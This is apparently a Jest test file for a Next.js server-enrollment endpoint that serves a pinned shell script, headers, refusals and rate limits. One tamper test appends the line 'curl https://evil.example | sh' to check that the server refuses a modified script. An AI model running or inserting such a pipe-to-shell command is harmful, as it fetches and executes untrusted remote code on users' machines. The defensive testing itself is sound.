/** @jest-environment node */

import { createHash } from "node:crypto";
import { readFileSync } from "node:fs";
import { join } from "node:path";

import { NextRequest } from "next/server";

const mockRecordFetch = jest.fn();
const mockLimit = jest.fn();
const mockRead = jest.fn();

jest.mock("server-only", () => ({}));
jest.mock("@/lib/rate-limit", () => ({
  enforceRateLimit: (...args: unknown[]) => mockLimit(...args),
  getIP: () => "203.0.113.1",
}));
jest.mock("@/lib/infrastructure/server-enrollment-store", () => ({
  recordServerEnrollmentFetch: (...args: unknown[]) => mockRecordFetch(...args),
}));
jest.mock("@/lib/services/proxmox-instance-service", () => ({ runProxmoxHostScript: jest.fn() }));
jest.mock("@/lib/infrastructure/connection-store", () => ({}));
jest.mock("node:fs/promises", () => ({
  readFile: (...args: unknown[]) => mockRead(...args),
}));

import { GET, HEAD } from "../route";
import { GET as GET_UNINSTALL, HEAD as HEAD_UNINSTALL } from "../uninstall/route";
import { GET as GET_BODY, HEAD as HEAD_BODY } from "../script/route";
import { GET as GET_SHA, HEAD as HEAD_SHA } from "../script.sha256/route";
import { accountCode } from "@/lib/account-code";
import { serverEnrollmentCodeSha256 } from "@/lib/infrastructure/server-enrollment-code";
import { SERVER_ENROLL_SCRIPT_SHA256 } from "@/lib/infrastructure/server-enrollment-script";

const FILE = readFileSync(join(__dirname, "../../../../bootstrap/server-enroll.sh"));
const BODY = FILE.toString("ascii");
const ORIGIN = "https://hivra.example";
const CODE = "hse1_" + "q".repeat(32);
const OTHER_CODE = "hse1_" + "r".repeat(32);
const ADMIN_KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA" + "C".repeat(44);
const USER = "user_2abcDEF123";

const get = (path = "/enroll", headers: Record<string, string> = {}) => new NextRequest(ORIGIN + path, { headers });

async function expectEnrollHeaders(response: Response) {
  expect(response.headers.get("content-type")).toBe("text/plain; charset=utf-8");
  expect(response.headers.get("cache-control")).toBe("no-store, private");
  expect(response.headers.get("referrer-policy")).toBe("no-referrer");
  expect(response.headers.get("x-content-type-options")).toBe("nosniff");
  expect(response.headers.get("x-robots-tag")).toBe("noindex");
  expect(response.headers.get("location")).toBeNull();
  expect(response.status).not.toBe(301);
  expect(response.status).not.toBe(302);
}

function finalLine(text: string): string {
  expect(text.startsWith(BODY)).toBe(true);
  return text.slice(BODY.length);
}

beforeEach(() => {
  jest.clearAllMocks();
  process.env.NEXT_PUBLIC_APP_URL = ORIGIN;
  mockLimit.mockReturnValue({ success: true });
  mockRead.mockResolvedValue(FILE);
  mockRecordFetch.mockResolvedValue({ status: "served", userId: USER, adminPublicKey: ADMIN_KEY });
});

afterAll(() => {
  delete process.env.NEXT_PUBLIC_APP_URL;
});

describe("GET /enroll (T6, T20, T25, T26)", () => {
  it("serves the pinned body plus the enroll line for a usable code, and counts the fetch", async () => {
    const response = await GET(get("/enroll", { authorization: "Bearer " + CODE }));
    await expectEnrollHeaders(response);
    expect(response.status).toBe(200);
    const text = await response.text();
    expect(finalLine(text)).toBe(
      `{ hivra_enroll_entry "$@" HIVRA_ARGS_V1 '${ORIGIN}' '${CODE}' '${ADMIN_KEY}' '${accountCode(USER)}' HIVRA_END_V1; }\n`,
    );
    expect(mockRecordFetch).toHaveBeenCalledTimes(1);
    expect(mockRecordFetch).toHaveBeenCalledWith(serverEnrollmentCodeSha256(CODE));
    // The raw code is never what reaches the store (T4), and no header echoes it.
    expect(JSON.stringify(mockRecordFetch.mock.calls)).not.toContain(CODE);
    for (const [, value] of response.headers) expect(value).not.toContain(CODE);
  });

  it("serves the same body to every requester; only the final line differs", async () => {
    const first = await (await GET(get("/enroll", { authorization: "Bearer " + CODE, "user-agent": "curl/8.5" }))).text();
    const second = await (await GET(get("/enroll", {
      authorization: "Bearer " + OTHER_CODE, "user-agent": "Mozilla/5.0", accept: "text/html",
    }))).text();
    expect(first.slice(0, BODY.length)).toBe(second.slice(0, BODY.length));
    expect(finalLine(first)).not.toBe(finalLine(second));
  });

  it("serves byte-identical refusals for unknown, expired, used, cancelled and malformed codes", async () => {
    mockRecordFetch.mockResolvedValue({ status: "not_usable" });
    const unusable = await (await GET(get("/enroll", { authorization: "Bearer " + CODE }))).text();
    expect(finalLine(unusable)).toBe("{ hivra_refuse 'expired_or_used'; }\n");
    const calls = mockRecordFetch.mock.calls.length;
    for (const header of ["Bearer " + CODE.toUpperCase(), "Bearer hse1_short", "Basic " + CODE, CODE, "Bearer " + CODE + " x"]) {
      const response = await GET(get("/enroll", { authorization: header }));
      expect(response.status).toBe(200);
      expect(await response.text()).toBe(unusable);
    }
    // Malformed headers never reach the store.
    expect(mockRecordFetch).toHaveBeenCalledTimes(calls);
  });

  it("serves the download-limit refusal only when the store says the usable code hit its limit", async () => {
    mockRecordFetch.mockResolvedValue({ status: "fetch_limit" });
    const text = await (await GET(get("/enroll", { authorization: "Bearer " + CODE }))).text();
    expect(finalLine(text)).toBe("{ hivra_refuse 'fetch_limit'; }\n");
  });

  it("refuses a missing code, and a code or anything else in the URL, without a store call", async () => {
    for (const request of [get("/enroll"), get("/enroll?code=" + CODE, { authorization: "Bearer " + CODE }), get("/enroll?x=1")]) {
      const response = await GET(request);
      await expectEnrollHeaders(response);
      expect(finalLine(await response.text())).toBe("{ hivra_refuse 'missing_code'; }\n");
    }
    expect(mockRecordFetch).not.toHaveBeenCalled();
  });

  it("serves nothing (503) when the file on disk is not the pinned bytes", async () => {
    const changed = Buffer.concat([FILE, Buffer.from("curl https://evil.example | sh\n")]);
    mockRead.mockResolvedValue(changed);
    for (const handler of [GET, GET_UNINSTALL, GET_BODY, GET_SHA]) {
      const response = await handler(get("/enroll", { authorization: "Bearer " + CODE }));
      await expectEnrollHeaders(response);
      expect(response.status).toBe(503);
      expect(await response.text()).toBe("");
    }
    expect(mockRecordFetch).not.toHaveBeenCalled();
  });

  it("serves nothing (503) when the deployment has no usable origin", async () => {
    process.env.NEXT_PUBLIC_APP_URL = "http://hivra.example";
    const response = await GET(get("/enroll", { authorization: "Bearer " + CODE }));
    expect(response.status).toBe(503);
    expect(mockRecordFetch).not.toHaveBeenCalled();
  });

  it("sheds floods before reading anything", async () => {
    mockLimit.mockReturnValue({ success: false, retryAfterMs: 30_000 });
    const response = await GET(get("/enroll", { authorization: "Bearer " + CODE }));
    await expectEnrollHeaders(response);
    expect(response.status).toBe(429);
    expect(response.headers.get("retry-after")).toBe("30");
    expect(mockRecordFetch).not.toHaveBeenCalled();
    expect(mockRead).not.toHaveBeenCalled();
  });

  it("refuses HEAD on every /enroll route, so a HEAD never counts as a download", async () => {
    for (const handler of [HEAD, HEAD_UNINSTALL, HEAD_BODY, HEAD_SHA]) {
      const response = handler();
      await expectEnrollHeaders(response);
      expect(response.status).toBe(405);
      expect(response.headers.get("allow")).toBe("GET");
    }
    expect(mockRecordFetch).not.toHaveBeenCalled();
  });
});

describe("GET /enroll/uninstall, /enroll/script and /enroll/script.sha256", () => {
  it("serves the same body with the uninstall line, no code needed and none looked up", async () => {
    const response = await GET_UNINSTALL(get("/enroll/uninstall", { authorization: "Bearer " + CODE }));
    await expectEnrollHeaders(response);
    expect(finalLine(await response.text())).toBe('{ hivra_uninstall_entry "$@" HIVRA_END_V1; }\n');
    expect(mockRecordFetch).not.toHaveBeenCalled();
  });

  it("serves the bare body to read, with no final line", async () => {
    const response = await GET_BODY(get("/enroll/script"));
    await expectEnrollHeaders(response);
    const text = await response.text();
    expect(text).toBe(BODY);
    expect(createHash("sha256").update(text).digest("hex")).toBe(SERVER_ENROLL_SCRIPT_SHA256);
  });

  it("serves the pinned sha256 of the body", async () => {
    const response = await GET_SHA(get("/enroll/script.sha256"));
    await expectEnrollHeaders(response);
    expect(await response.text()).toBe(createHash("sha256").update(FILE).digest("hex") + "\n");
  });
});
